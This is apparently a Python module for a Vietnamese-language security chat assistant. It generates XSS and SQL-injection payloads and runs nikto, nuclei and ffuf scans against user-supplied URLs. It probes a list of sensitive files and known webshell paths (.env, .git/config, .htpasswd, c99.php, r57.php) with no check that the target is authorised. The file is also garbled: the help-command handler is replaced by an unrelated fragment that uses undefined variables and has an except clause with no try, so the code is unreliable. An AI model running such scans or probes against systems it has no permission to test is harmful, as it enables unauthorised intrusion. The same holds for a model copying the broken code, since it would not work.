"""
Chat Assistant RAG System - Tập trung vào Chat Assistant với RAG về lỗ hổng
"""

import json
import os
import re
import time
import asyncio
import requests
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from app.clients.gemini_client import GeminiClient
from app.core.kb_retriever import AdvancedKBRetriever, KnowledgeDocument

class ChatCommand(Enum):
    """Các lệnh chat"""
    PAYLOAD = "/payload"
    SCAN = "/scan"
    SCAN_STATUS = "/scan-status"
    SCAN_RESULTS = "/scan-results"
    SCAN_CANCEL = "/scan-cancel"
    HELP = "/help"
    REPORT = "/report"
    RECOMMEND = "/recommend"
    GREETING = "/"
    UNKNOWN = "unknown"

class VulnerabilityType(Enum):
    """Các loại lỗ hổng"""
    XSS = "xss"
    SQL_INJECTION = "sql_injection"
    MISCONFIGURATION = "misconfiguration"
    IDOR = "idor"

@dataclass
class ChatResponse:
    """Response của chat assistant"""
    message: str
    command: ChatCommand
    vulnerability_type: Optional[VulnerabilityType] = None
    target_url: Optional[str] = None
    payloads: Optional[List[str]] = None
    scan_results: Optional[Dict[str, Any]] = None
    llm_analysis: Optional[str] = None
    suggestions: Optional[List[str]] = None

class ChatAssistantRAG:
    """Chat Assistant RAG System với RAG về lỗ hổng"""
    
    def __init__(self):
        self.llm_client = GeminiClient()
        try:
            from app.core.enhanced_rag_retriever import EnhancedRAGRetriever
            self.kb_retriever = EnhancedRAGRetriever()
        except Exception as e:
            print(f"RAG retriever init error: {e}")
            self.kb_retriever = None
        self.vulnerability_rag = self._load_vulnerability_rag()
        self.conversation_history = []
    
    def _load_vulnerability_rag(self) -> Dict[str, Any]:
        """Load vulnerability RAG data"""
        try:
            # Try master RAG first
            master_rag_file = os.path.join(os.path.dirname(__file__), '..', 'data', 'complete_master_rag.json')
            if os.path.exists(master_rag_file):
                with open(master_rag_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            
            # Try complete RAG second
            complete_rag_file = os.path.join(os.path.dirname(__file__), '..', 'data', 'chat_assistant_complete_rag.json')
            if os.path.exists(complete_rag_file):
                with open(complete_rag_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            
            # Try enhanced RAG third
            enhanced_rag_file = os.path.join(os.path.dirname(__file__), '..', 'data', 'enhanced_vulnerability_rag.json')
            if os.path.exists(enhanced_rag_file):
                with open(enhanced_rag_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            
            # Fallback to original RAG
            rag_file = os.path.join(os.path.dirname(__file__), '..', 'data', 'vulnerability_rag_with_urls.json')
            with open(rag_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading vulnerability RAG: {e}")
            return {}
    
    async def process_message(self, user_message: str, user_id: str = "default") -> ChatResponse:
        """
        Xử lý tin nhắn từ người dùng
        """
        try:
            # Clean message
            message = user_message.strip()
            
            # Detect command
            command = self._detect_command(message)
            
            # Process based on command
            if command == ChatCommand.PAYLOAD:
                return await self._handle_payload_command(message)
            elif command == ChatCommand.SCAN:
                return await self._handle_scan_command(message)
            elif command == ChatCommand.HELP:
                return await self._handle_help_command()
            elif command == ChatCommand.REPORT:
                return await self._handle_report_command(message)
            elif command == ChatCommand.RECOMMEND:
                return await self._handle_recommend_command(message)
            elif command == ChatCommand.GREETING:
                return await self._handle_greeting_command()
            else:
                return await self._handle_natural_conversation(message)
                
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi: {str(e)}",
                command=ChatCommand.UNKNOWN,
                suggestions=["Hãy thử lại", "Sử dụng /help để xem hướng dẫn"]
            )
    
    def _detect_command(self, message: str) -> ChatCommand:
        """Detect command từ message"""
        message_lower = message.lower()
        
        if message_lower.startswith('/payload'):
            return ChatCommand.PAYLOAD
        elif message_lower.startswith('/scan-status'):
            return ChatCommand.SCAN_STATUS
        elif message_lower.startswith('/scan-results'):
            return ChatCommand.SCAN_RESULTS
        elif message_lower.startswith('/scan-cancel'):
            return ChatCommand.SCAN_CANCEL
        elif message_lower.startswith('/scan'):
            return ChatCommand.SCAN
        elif message_lower.startswith('/help'):
            return ChatCommand.HELP
        elif message_lower.startswith('/report'):
            return ChatCommand.REPORT
        elif message_lower.startswith('/recommend'):
            return ChatCommand.RECOMMEND
        elif message_lower.startswith('/') or message_lower in ['hi', 'hello', 'chào', 'xin chào']:
            return ChatCommand.GREETING
        else:
            return ChatCommand.UNKNOWN
    
    async def _handle_payload_command(self, message: str) -> ChatResponse:
        """Xử lý lệnh /payload với enhanced features"""
        try:
            # Parse message để lấy vulnerability type và URL
            parts = message.split()
            vulnerability_type = None
            target_url = None
            parameter = None
            
            # Extract vulnerability type
            for part in parts:
                if part.lower() in ['xss', 'sql', 'sql_injection', 'misconfig', 'misconfiguration', 'idor']:
                    if part.lower() in ['xss']:
                        vulnerability_type = VulnerabilityType.XSS
                    elif part.lower() in ['sql', 'sql_injection']:
                        vulnerability_type = VulnerabilityType.SQL_INJECTION
                    elif part.lower() in ['misconfig', 'misconfiguration']:
                        vulnerability_type = VulnerabilityType.MISCONFIGURATION
                    elif part.lower() in ['idor']:
                        vulnerability_type = VulnerabilityType.IDOR
                    break
            
            # Extract URL
            url_pattern = r'https?://[^\s]+'
            url_match = re.search(url_pattern, message)
            if url_match:
                target_url = url_match.group()
            
            # Extract parameter (if specified)
            param_pattern = r'param[=:]\s*(\w+)'
            param_match = re.search(param_pattern, message, re.IGNORECASE)
            if param_match:
                parameter = param_match.group(1)
            
            # Generate enhanced payloads
            payloads = await self._generate_enhanced_payloads(vulnerability_type, target_url, parameter)
            
            # Generate test URLs
            test_urls = self._generate_test_urls(target_url, payloads, parameter)
            
            # Get RAG context for better suggestions
            rag_context = self._get_payload_rag_context(vulnerability_type.value if vulnerability_type else "general")
            
            # Create enhanced response message
            response_message = "[EXPLOSION] **Enhanced Payload Generator**\n\n"
            
            if vulnerability_type:
                response_message += f"[SCAN] **Loại lỗ hổng:** {vulnerability_type.value.upper()}\n"
            else:
                response_message += "[SCAN] **Loại lỗ hổng:** Chưa xác định (sẽ tạo payloads tổng quát)\n"
            
            if target_url:
                response_message += f"[LOCATION] **Target URL:** {target_url}\n"
            else:
                response_message += "[LOCATION] **Target URL:** Chưa cung cấp\n"
            
            if parameter:
                response_message += f"[WRENCH] **Parameter:** {parameter}\n"
            
            response_message += f"\n[PAYLOAD] **Generated {len(payloads)} payloads:**\n"
            for i, payload in enumerate(payloads[:8], 1):
                response_message += f"{i}. `{payload}`\n"
            
            if len(payloads) > 8:
                response_message += f"... và {len(payloads) - 8} payloads khác\n"
            
            # Add test URLs if available
            if test_urls:
                response_message += f"\n[TEST] **Test URLs (top 3):**\n"
                for i, test_url in enumerate(test_urls[:3], 1):
                    response_message += f"{i}. `{test_url}`\n"
            
            # Enhanced suggestions
            response_message += "\n[IDEA] **Enhanced Suggestions:**\n"
            response_message += "• Test payloads trên target URL\n"
            response_message += "• Sử dụng Burp Suite hoặc OWASP ZAP\n"
            response_message += "• Kiểm tra response để xác nhận lỗ hổng\n"
            response_message += "• Sử dụng /scan để scan tự động\n"
            
            # Add RAG-based recommendations
            if rag_context:
                response_message += f"\n[BOOK] **Knowledge Base Insights:**\n"
                response_message += f"• {rag_context[:200]}...\n"
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.PAYLOAD,
                vulnerability_type=vulnerability_type,
                target_url=target_url,
                payloads=payloads,
                suggestions=[
                    f"Test payloads trên {target_url}" if target_url else "Cung cấp target URL",
                    f"Test parameter: {parameter}" if parameter else "Specify parameter với param=name",
                    "Sử dụng /scan để scan lỗ hổng tự động",
                    "Xem thêm payloads với /payload xss",
                    "Hướng dẫn sử dụng /help"
                ]
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi khi tạo payload: {str(e)}",
                command=ChatCommand.PAYLOAD,
                suggestions=["Hãy thử lại", "Sử dụng /help để xem hướng dẫn"]
            )
    
    async def _handle_scan_command(self, message: str) -> ChatResponse:
        """Xử lý lệnh /scan - Thực sự chạy scan và trả về kết quả"""
        try:
            # Extract URL from message
            url_pattern = r'https?://[^\s]+'
            url_match = re.search(url_pattern, message)
            
            if not url_match:
                return ChatResponse(
                    message="[ERROR] **Lỗi:** Vui lòng cung cấp URL để scan\n\n**Ví dụ:** `/scan http://testphp.vulnweb.com`",
                    command=ChatCommand.SCAN,
                    suggestions=[
                        "Cung cấp URL hợp lệ",
                        "Ví dụ: /scan http://testphp.vulnweb.com",
                        "Sử dụng /help để xem hướng dẫn"
                    ]
                )
            
            target_url = url_match.group()
            
            # Thực sự chạy scan với các tool thực tế
            print(f"[SCAN] Starting real scan for {target_url}")
            
            # Import real tools integration
            from app.core.real_tools_integration import RealToolsIntegration
            
            # Run all security tools
            tools_results = await RealToolsIntegration.run_all_tools(target_url)
            
            # Perform basic HTTP analysis
            http_analysis = await self._perform_http_analysis(target_url)
            
            # Get RAG context for analysis
            rag_context = self._get_scan_rag_context(target_url)
            
            # Combine results
            scan_results = {
                'target_url': target_url,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'tools_scan_time': tools_results.get('scan_time', 0),
                'http_analysis': http_analysis,
                'nikto_results': tools_results.get('nikto_results', []),
                'nuclei_results': tools_results.get('nuclei_results', []),
                'ffuf_results': tools_results.get('ffuf_results', []),
                'httpx_results': tools_results.get('httpx_results', {}),
                'rag_context': rag_context
            }
            
            # Analyze with LLM + RAG
            llm_analysis = self._analyze_scan_results_with_llm_rag(scan_results)
            
            # Format response
            response_message = self._format_scan_response(scan_results, llm_analysis)
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.SCAN,
                suggestions=[
                    f"/payload xss {target_url}",
                    f"/payload sql {target_url}",
                    "/help"
                ]
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] **Lỗi scan:** {str(e)}",
                command=ChatCommand.SCAN,
                suggestions=[
                    "Kiểm tra URL có hợp lệ không",
                    "Thử với target khác",
                    "Sử dụng /help để xem hướng dẫn"
                ]
            )
    
    async def _handle_help_command(self) -> ChatResponse:
            if scan_results.get('http_response'):
                http_resp = scan_results['http_response']
                response_message += "## [CHART] **Phân Tích HTTP Response**\n"
                response_message += f"[OK] **Status Code:** {http_resp.get('status_code', 'N/A')}\n"
                response_message += f"[PACKAGE] **Kích thước response:** {http_resp.get('content_length', 0):,} bytes\n"
                response_message += f"[DOCUMENT] **Content Type:** {http_resp.get('content_type', 'N/A')}\n"
                response_message += f"[SERVER] **Web Server:** {http_resp.get('server', 'N/A')}\n"
                response_message += f"[LIGHTNING] **Thời gian phản hồi:** {http_resp.get('response_time', 'N/A')}\n"
                response_message += f"[REFRESH] **Redirects:** {http_resp.get('redirect_count', 0)}\n"
                response_message += f"[TARGET] **Final URL:** {http_resp.get('final_url', target_url)}\n\n"
                
                # Security Headers - Enhanced
                if http_resp.get('security_headers'):
                    sec_headers = http_resp['security_headers']
                    security_score = sec_headers.get('security_score', 0)
                    
                    # Color-coded security score
                    if security_score >= 80:
                        score_emoji = "[LARGE_GREEN_CIRCLE]"
                        score_text = "Tốt"
                    elif security_score >= 60:
                        score_emoji = "[LARGE_YELLOW_CIRCLE]"
                        score_text = "Trung bình"
                    else:
                        score_emoji = "[LARGE_RED_CIRCLE]"
                        score_text = "Kém"
                    
                    response_message += "## [SECURITY] **Phân Tích Security Headers**\n"
                    response_message += f"{score_emoji} **Điểm bảo mật:** {security_score:.1f}% ({score_text})\n"
                    response_message += f"[OK] **Headers có sẵn:** {len(sec_headers.get('present', []))}\n"
                    response_message += f"[ERROR] **Headers thiếu:** {len(sec_headers.get('missing', []))}\n\n"
                    
                    # Show present headers
                    if sec_headers.get('present'):
                        response_message += "**[OK] Headers bảo mật có sẵn:**\n"
                        for present in sec_headers['present'][:5]:
                            response_message += f"  • {present['header']}: {present['value'][:50]}...\n"
                        response_message += "\n"
                    
                    # Show missing headers
                    if sec_headers.get('missing'):
                        response_message += "**[ERROR] Headers bảo mật thiếu:**\n"
                        for missing in sec_headers['missing'][:5]:
                            response_message += f"  • {missing['header']}: {missing['description']}\n"
                        response_message += "\n"
                
                # Detailed Headers Analysis
                if scan_results.get('detailed_headers'):
                    detailed = scan_results['detailed_headers']
                    response_message += "## [SCAN] **Phân Tích Headers Chi Tiết**\n"
                    
                    # Server info
                    if detailed.get('server_info'):
                        server_info = detailed['server_info']
                        response_message += f"[SERVER] **Server:** {server_info.get('server', 'Unknown')}\n"
                        response_message += f"[TOOL] **Technology:** {server_info.get('technology', 'Unknown')}\n"
                        if server_info.get('version_disclosed'):
                            response_message += "[WARNING] **Cảnh báo:** Version được tiết lộ\n"
                        response_message += "\n"
                    
                    # Suspicious headers
                    if detailed.get('suspicious_headers'):
                        response_message += "[ALERT] **Headers đáng ngờ:**\n"
                        for sus in detailed['suspicious_headers'][:3]:
                            response_message += f"  • {sus['header']}: {sus['reason']}\n"
                        response_message += "\n"
                
                # Response Body Analysis
                if scan_results.get('response_body_analysis'):
                    body_analysis = scan_results['response_body_analysis']
                    response_message += "## [DOCUMENT] **Phân Tích Response Body**\n"
                    response_message += f"[CHART] **Kích thước:** {body_analysis.get('content_length', 0):,} bytes\n"
                    response_message += f"[NOTE] **Có forms:** {'Có' if body_analysis.get('has_forms') else 'Không'}\n"
                    response_message += f"[LIGHTNING] **Có JavaScript:** {'Có' if body_analysis.get('has_javascript') else 'Không'}\n"
                    
                    # Sensitive information
                    if body_analysis.get('sensitive_info_disclosed'):
                        response_message += "\n[ALERT] **Thông tin nhạy cảm được tiết lộ:**\n"
                        for info in body_analysis['sensitive_info_disclosed'][:3]:
                            response_message += f"  • {info['type']}\n"
                    
                    # Error messages
                    if body_analysis.get('error_messages'):
                        response_message += "\n[WARNING] **Error messages:**\n"
                        for error in body_analysis['error_messages'][:3]:
                            response_message += f"  • {error[:100]}...\n"
                    
                    # Version info
                    if body_analysis.get('version_info'):
                        response_message += "\n[LIST] **Version information:**\n"
                        for version in body_analysis['version_info'][:3]:
                            response_message += f"  • {version}\n"
                    
                    response_message += "\n"
                
                # SSL Analysis
                if scan_results.get('ssl_analysis'):
                    ssl_analysis = scan_results['ssl_analysis']
                    response_message += "## [SECURE] **Phân Tích SSL/TLS**\n"
                    response_message += f"[LOCK] **SSL Enabled:** {'Có' if ssl_analysis.get('ssl_enabled') else 'Không'}\n"
                    if ssl_analysis.get('ssl_enabled'):
                        cert_info = ssl_analysis.get('certificate_info', {})
                        response_message += f"[CERT] **Protocol:** {cert_info.get('protocol', 'Unknown')}\n"
                        response_message += f"[OK] **Certificate Valid:** {'Có' if cert_info.get('certificate_valid') else 'Không'}\n"
                    
                    if ssl_analysis.get('security_issues'):
                        response_message += "\n[WARNING] **SSL Security Issues:**\n"
                        for issue in ssl_analysis['security_issues']:
                            response_message += f"  • {issue}\n"
                    response_message += "\n"
                
                # Cookies Analysis
                if scan_results.get('cookies_analysis'):
                    cookies_analysis = scan_results['cookies_analysis']
                    response_message += "## [COOKIE] **Phân Tích Cookies**\n"
                    response_message += f"[COOKIE] **Tổng số cookies:** {cookies_analysis.get('cookies_count', 0)}\n"
                    response_message += f"[SECURE] **Secure cookies:** {cookies_analysis.get('secure_count', 0)}\n"
                    response_message += f"[SECURITY] **HttpOnly cookies:** {cookies_analysis.get('http_only_count', 0)}\n"
                    response_message += f"[LOCK] **SameSite cookies:** {cookies_analysis.get('same_site_count', 0)}\n"
                    
                    if cookies_analysis.get('security_issues'):
                        response_message += "\n[WARNING] **Cookie Security Issues:**\n"
                        for issue in cookies_analysis['security_issues'][:3]:
                            response_message += f"  • {issue}\n"
                    response_message += "\n"
            
            # Technology Detection - Enhanced
            if scan_results.get('technology'):
                tech = scan_results['technology']
                response_message += "## [TOOL] **Phát Hiện Technology Stack**\n"
                response_message += f"[SERVER] **Web Server:** {tech.get('server', 'Unknown')}\n"
                if tech.get('cms'):
                    response_message += f"[NOTE] **CMS:** {tech['cms']}\n"
                if tech.get('frameworks'):
                    response_message += f"[LIGHTNING] **Frameworks:** {', '.join(tech['frameworks'])}\n"
                if tech.get('languages'):
                    response_message += f"[LAPTOP] **Programming Languages:** {', '.join(tech['languages'])}\n"
                response_message += "\n"
            
            # Discovered Paths - Enhanced
            if scan_results.get('discovered_paths'):
                paths = scan_results['discovered_paths']
                response_message += "## [FOLDER] **Khám Phá Paths & Files**\n"
                response_message += f"[SCAN] **Tổng số paths tìm thấy:** {len(paths)}\n\n"
                
                # Group by status
                status_groups = {}
                for path in paths:
                    status = path['status']
                    if status not in status_groups:
                        status_groups[status] = []
                    status_groups[status].append(path)
                
                for status, path_list in status_groups.items():
                    status_emoji = "[LARGE_GREEN_CIRCLE]" if status == 200 else "[LARGE_YELLOW_CIRCLE]" if status in [301, 302] else "[LARGE_RED_CIRCLE]"
                    response_message += f"{status_emoji} **Status {status}:** {len(path_list)} paths\n"
                    for path in path_list[:5]:  # Show first 5 of each status
                        response_message += f"  • {path['url']}\n"
                    if len(path_list) > 5:
                        response_message += f"  ... và {len(path_list) - 5} paths khác\n"
                    response_message += "\n"
            
            # Vulnerability Findings - Enhanced
            if scan_results.get('vulnerabilities'):
                vulns = scan_results['vulnerabilities']
                response_message += "## [ALERT] **Phát Hiện Lỗ Hổng Bảo Mật**\n"
                response_message += f"[TARGET] **Tổng số lỗ hổng:** {len(vulns)}\n"
                
                # Group by severity with emojis
                severity_counts = {}
                severity_emojis = {
                    'Critical': '[LARGE_RED_CIRCLE]',
                    'High': '[LARGE_ORANGE_CIRCLE]', 
                    'Medium': '[LARGE_YELLOW_CIRCLE]',
                    'Low': '[LARGE_GREEN_CIRCLE]',
                    'Info': '[LARGE_BLUE_CIRCLE]'
                }
                
                for vuln in vulns:
                    severity = vuln.get('severity', 'Unknown')
                    severity_counts[severity] = severity_counts.get(severity, 0) + 1
                
                response_message += "\n**[CHART] Phân loại theo mức độ nghiêm trọng:**\n"
                for severity, count in severity_counts.items():
                    emoji = severity_emojis.get(severity, '[LARGE_WHITE_CIRCLE]')
                    response_message += f"{emoji} **{severity}:** {count} lỗ hổng\n"
                response_message += "\n"
                
                # Show detailed findings
                response_message += "**[SCAN] Chi tiết các lỗ hổng:**\n"
                for i, vuln in enumerate(vulns[:8], 1):  # Show more findings
                    severity = vuln.get('severity', 'Unknown')
                    emoji = severity_emojis.get(severity, '[LARGE_WHITE_CIRCLE]')
                    
                    response_message += f"\n**{i}. {emoji} {vuln.get('type', 'Unknown')}**\n"
                    response_message += f"   [TARGET] **Mức độ:** {severity}\n"
                    response_message += f"   [LOCATION] **Path:** {vuln.get('path', 'N/A')}\n"
                    if vuln.get('parameter'):
                        response_message += f"   [TOOL] **Parameter:** {vuln['parameter']}\n"
                    response_message += f"   [NOTE] **Evidence:** {vuln.get('evidence', 'N/A')[:150]}...\n"
                    if vuln.get('cwe'):
                        response_message += f"   [TAG] **CWE:** {vuln['cwe']}\n"
                    if vuln.get('owasp'):
                        response_message += f"   [SECURITY] **OWASP:** {vuln['owasp']}\n"
                
                if len(vulns) > 8:
                    response_message += f"\n... và {len(vulns) - 8} lỗ hổng khác\n"
                response_message += "\n"
            
            # LLM Analysis - Enhanced
            response_message += "## [ROBOT] **Phân Tích Bảo Mật Bằng AI**\n"
            response_message += "---\n"
            response_message += llm_analysis
            response_message += "\n---\n"
            
            # Summary and recommendations
            response_message += "\n## [LIST] **Tóm Tắt & Khuyến Nghị**\n"
            response_message += "### [TARGET] **Hành Động Ưu Tiên:**\n"
            response_message += "1. **Kiểm tra ngay** các lỗ hổng Critical và High\n"
            response_message += "2. **Cập nhật** security headers thiếu\n"
            response_message += "3. **Xem xét** các thông tin nhạy cảm được tiết lộ\n"
            response_message += "4. **Thực hiện** penetration testing thủ công\n\n"
            
            response_message += "### [TOOL] **Công Cụ Khuyến Nghị:**\n"
            response_message += "• **Burp Suite** - Để test chi tiết các lỗ hổng\n"
            response_message += "• **OWASP ZAP** - Để scan tự động\n"
            response_message += "• **Nmap** - Để scan ports và services\n"
            response_message += "• **Nikto** - Để scan web server vulnerabilities\n\n"
            
            response_message += "### [BOOK] **Tài Liệu Tham Khảo:**\n"
            response_message += "• [OWASP Top 10](https://owasp.org/www-project-top-ten/)\n"
            response_message += "• [CWE Database](https://cwe.mitre.org/)\n"
            response_message += "• [Security Headers](https://securityheaders.com/)\n"
            response_message += "• [Mozilla Security Guidelines](https://infosec.mozilla.org/guidelines/)\n"
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.SCAN,
                target_url=target_url,
                scan_results=scan_results,
                llm_analysis=llm_analysis,
                suggestions=[
                    f"/payload xss {target_url}",
                    f"/payload sql_injection {target_url}",
                    f"/payload misconfig {target_url}",
                    "Phân tích response headers chi tiết",
                    "Kiểm tra các subdomain khác"
                ]
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi khi khởi tạo scan: {str(e)}",
                command=ChatCommand.SCAN,
                suggestions=["Hãy thử lại", "Kiểm tra URL", "Sử dụng /help để xem hướng dẫn"]
            )
    
    async def _perform_enhanced_scan(self, target_url: str) -> Dict[str, Any]:
        """Perform enhanced scan immediately with detailed analysis và timeout handling"""
        try:
            import time
            import requests
            from urllib.parse import urlparse, urljoin
            import re
            from bs4 import BeautifulSoup
            import json
            
            scan_results = {
                'target_url': target_url,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'http_response': {},
                'technology': {},
                'discovered_paths': [],
                'vulnerabilities': [],
                'forms': [],
                'links': [],
                'security_analysis': {},
                'detailed_headers': {},
                'response_body_analysis': {},
                'subdomain_discovery': [],
                'port_scan': {},
                'ssl_analysis': {},
                'cms_analysis': {},
                'api_endpoints': [],
                'sensitive_files': [],
                'error_pages': [],
                'cookies_analysis': {},
                'redirect_analysis': []
            }
            
            # 1. Enhanced HTTP Response Analysis với timeout tốt hơn
            try:
                start_time = time.time()
                response = requests.get(target_url, timeout=30, allow_redirects=True)  # Tăng timeout lên 30s
                response_time = time.time() - start_time
                
                # Detailed headers analysis
                detailed_headers = self._analyze_detailed_headers(response.headers)
                
                # Response body analysis
                body_analysis = self._analyze_response_body(response.text, response.headers)
                
                # SSL/TLS analysis
                ssl_analysis = self._analyze_ssl_connection(target_url, response)
                
                # Cookies analysis
                cookies_analysis = self._analyze_cookies(response.cookies, response.headers)
                
                scan_results['http_response'] = {
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'content_type': response.headers.get('Content-Type', 'N/A'),
                    'server': response.headers.get('Server', 'N/A'),
                    'response_time': f"{response_time:.2f}s",
                    'final_url': response.url,
                    'redirect_count': len(response.history),
                    'headers': dict(response.headers),
                    'security_headers': self._analyze_security_headers(response.headers)
                }
                
                scan_results['detailed_headers'] = detailed_headers
                scan_results['response_body_analysis'] = body_analysis
                scan_results['ssl_analysis'] = ssl_analysis
                scan_results['cookies_analysis'] = cookies_analysis
                
                # 2. Technology Detection
                scan_results['technology'] = self._detect_technology(response.text, response.headers)
                
                # 3. Parse HTML content
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract links
                    links = []
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        if href.startswith('/'):
                            full_url = urljoin(target_url, href)
                        elif href.startswith('http'):
                            full_url = href
                        else:
                            continue
                        
                        if target_url.split('/')[2] in full_url:  # Same domain
                            links.append(full_url)
                    
                    scan_results['links'] = list(set(links))[:20]  # Limit to 20 unique links
                    
                    # Extract forms
                    forms = []
                    for form in soup.find_all('form'):
                        form_data = {
                            'action': form.get('action', ''),
                            'method': form.get('method', 'GET').upper(),
                            'inputs': []
                        }
                        
                        for input_tag in form.find_all(['input', 'select', 'textarea']):
                            form_data['inputs'].append({
                                'name': input_tag.get('name', ''),
                                'type': input_tag.get('type', 'text'),
                                'value': input_tag.get('value', '')
                            })
                        
                        forms.append(form_data)
                    
                    scan_results['forms'] = forms
                
            except Exception as e:
                scan_results['http_response']['error'] = str(e)
            
            # 4. Enhanced Directory/File Discovery
            common_paths = [
                # Admin panels
                '/admin', '/administrator', '/admin.php', '/admin.html', '/admin/',
                '/wp-admin/', '/wp-login.php', '/login', '/login.php', '/signin',
                '/dashboard', '/control', '/manage', '/manager', '/panel',
                
                # API endpoints
                '/api', '/api/', '/api/v1', '/api/v2', '/rest', '/graphql',
                '/swagger', '/swagger-ui', '/docs', '/documentation',
                
                # Development/Test
                '/test', '/testing', '/dev', '/development', '/staging', '/stage',
                '/debug', '/debug.php', '/phpinfo.php', '/info.php',
                
                # Configuration files
                '/.env', '/.env.local', '/.env.production', '/config.php',
                '/wp-config.php', '/configuration.php', '/settings.php',
                '/config.json', '/config.xml', '/web.config', '/.htaccess',
                
                # Backup files
                '/backup', '/backups', '/backup.sql', '/database.sql',
                '/dump.sql', '/backup.zip', '/backup.tar.gz',
                
                # Version control
                '/.git/', '/.svn/', '/.hg/', '/.bzr/', '/.git/config',
                '/.git/HEAD', '/.svn/entries', '/.hg/hgrc',
                
                # Sensitive files
                '/robots.txt', '/sitemap.xml', '/sitemap.txt', '/crossdomain.xml',
                '/favicon.ico', '/apple-touch-icon.png', '/manifest.json',
                
                # CMS specific
                '/wp-content/', '/wp-includes/', '/wp-json/', '/xmlrpc.php',
                '/drupal/', '/joomla/', '/magento/', '/prestashop/',
                
                # Database admin
                '/phpmyadmin/', '/pma/', '/mysql/', '/dbadmin/',
                '/adminer.php', '/phpPgAdmin/', '/sqlbuddy/',
                
                # File uploads
                '/uploads/', '/files/', '/images/', '/media/', '/assets/',
                '/static/', '/public/', '/www/', '/htdocs/',
                
                # Security files
                '/.well-known/security.txt', '/security.txt', '/.security',
                '/.htpasswd', '/.htaccess', '/.htgroup',
                
                # Logs
                '/logs/', '/log/', '/error.log', '/access.log',
                '/error_log', '/access_log', '/debug.log',
                
                # Temporary files
                '/tmp/', '/temp/', '/cache/', '/tmp.php', '/temp.php',
                
                # Common vulnerabilities
                '/shell.php', '/c99.php', '/r57.php', '/b374k.php',
                '/webshell.php', '/cmd.php', '/eval.php'
            ]
            
            discovered_paths = []
            for path in common_paths:
                try:
                    url = target_url.rstrip('/') + path
                    path_response = requests.head(url, timeout=5)
                    
                    if path_response.status_code in [200, 301, 302, 403]:
                        discovered_paths.append({
                            'url': url,
                            'status': path_response.status_code,
                            'length': path_response.headers.get('content-length', 0),
                            'server': path_response.headers.get('Server', ''),
                            'content_type': path_response.headers.get('Content-Type', '')
                        })
                except:
                    continue
            
            scan_results['discovered_paths'] = discovered_paths
            
            # 5. Real Tool Vulnerability Scanning
            vulnerabilities = []
            
            # Import real tools integration
            from app.core.real_tools_integration import RealToolsIntegration
            
            # Run real security tools
            print(f"[TOOL] Running real security tools on {target_url}")
            
            # Run all tools in parallel
            tools_results = await RealToolsIntegration.run_all_tools(target_url)
            
            # Add Nikto results
            if tools_results.get('nikto_results'):
                vulnerabilities.extend(tools_results['nikto_results'])
                print(f"[NIKTO] Found {len(tools_results['nikto_results'])} vulnerabilities")
            
            # Add Nuclei results
            if tools_results.get('nuclei_results'):
                vulnerabilities.extend(tools_results['nuclei_results'])
                print(f"[NUCLEI] Found {len(tools_results['nuclei_results'])} vulnerabilities")
            
            # Add FFUF results to discovered paths
            if tools_results.get('ffuf_results'):
                scan_results['discovered_paths'].extend(tools_results['ffuf_results'])
                print(f"[FFUF] Found {len(tools_results['ffuf_results'])} paths")
            
            # Add HTTPX results to technology detection
            if tools_results.get('httpx_results'):
                httpx_data = tools_results['httpx_results']
                if httpx_data.get('technologies'):
                    scan_results['technology']['httpx_tech'] = httpx_data['technologies']
                if httpx_data.get('title'):
                    scan_results['technology']['httpx_title'] = httpx_data['title']
            
            # XSS Detection with real payloads
            xss_findings = await self._scan_xss_vulnerabilities(target_url)
            vulnerabilities.extend(xss_findings)
            
            # SQL Injection Detection with real payloads
            sql_findings = await self._scan_sql_injection_vulnerabilities(target_url)
            vulnerabilities.extend(sql_findings)
            
            # Security Misconfiguration Detection
            misconfig_findings = await self._scan_misconfig_vulnerabilities(target_url)
            vulnerabilities.extend(misconfig_findings)
            
            scan_results['vulnerabilities'] = vulnerabilities
            scan_results['tools_scan_time'] = tools_results.get('scan_time', 0)
            
            return scan_results
            
        except Exception as e:
            return {
                'target_url': target_url,
                'error': str(e),
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }
    
    def _analyze_security_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze security headers"""
        security_headers = {
            'X-Frame-Options': 'Prevents clickjacking',
            'X-Content-Type-Options': 'Prevents MIME sniffing',
            'X-XSS-Protection': 'XSS protection',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Content-Security-Policy': 'Content security policy',
            'Referrer-Policy': 'Referrer information control',
            'Permissions-Policy': 'Feature permissions'
        }
        
        present = []
        missing = []
        
        for header, description in security_headers.items():
            if header in headers:
                present.append({'header': header, 'value': headers[header], 'description': description})
            else:
                missing.append({'header': header, 'description': description})
        
        return {
            'present': present,
            'missing': missing,
            'missing_count': len(missing),
            'security_score': len(present) / len(security_headers) * 100
        }
    
    def _detect_technology(self, content: str, headers: Dict[str, str]) -> Dict[str, Any]:
        """Detect web technologies"""
        technologies = {
            'server': headers.get('Server', 'Unknown'),
            'cms': None,
            'frameworks': [],
            'languages': []
        }
        
        # Detect CMS
        if 'wordpress' in content.lower() or 'wp-content' in content:
            technologies['cms'] = 'WordPress'
        elif 'drupal' in content.lower():
            technologies['cms'] = 'Drupal'
        elif 'joomla' in content.lower():
            technologies['cms'] = 'Joomla'
        
        # Detect frameworks
        if 'bootstrap' in content.lower():
            technologies['frameworks'].append('Bootstrap')
        if 'jquery' in content.lower():
            technologies['frameworks'].append('jQuery')
        if 'react' in content.lower():
            technologies['frameworks'].append('React')
        if 'angular' in content.lower():
            technologies['frameworks'].append('Angular')
        
